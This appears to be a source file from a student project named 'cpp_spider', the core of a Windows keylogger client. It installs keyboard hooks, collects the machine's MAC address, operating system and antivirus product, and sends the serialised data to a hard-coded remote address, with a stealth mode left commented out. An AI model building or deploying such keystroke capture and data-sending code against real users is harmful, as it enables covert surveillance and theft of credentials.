/*
** ClientCore.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientCore.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:59:44 2017 Maxime PILLON
** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
*/

#include "Protocol/Buffer.hpp"
#include "Protocol/ClientProtocol.hpp"
#include "Protocol/ServerProtocol.hpp"
#include "KeyLogger/WindowsKeyLogger.hpp"
#include "ClientCore.hpp"

spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("192.1.1.1", PORT)),
				   _keylogger(new spider::WindowsKeyLogger())
{}

spider::ClientCore::~ClientCore()
{}

void spider::ClientCore::run()
{
  MSG msg;
  bool running;

  running = true;
  //_keylogger->stealth();
  _keylogger->initHooks();
  _keylogger->getMacAddr();
  _keylogger->getOperatingSystem();
  _keylogger->getAntiVirus();
  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
  while (running)
  {
    if (!GetMessage(&msg, NULL, 0, 0))
      running = false;
    TranslateMessage(&msg);
    DispatchMessage(&msg);
    _proto->run();
  }
}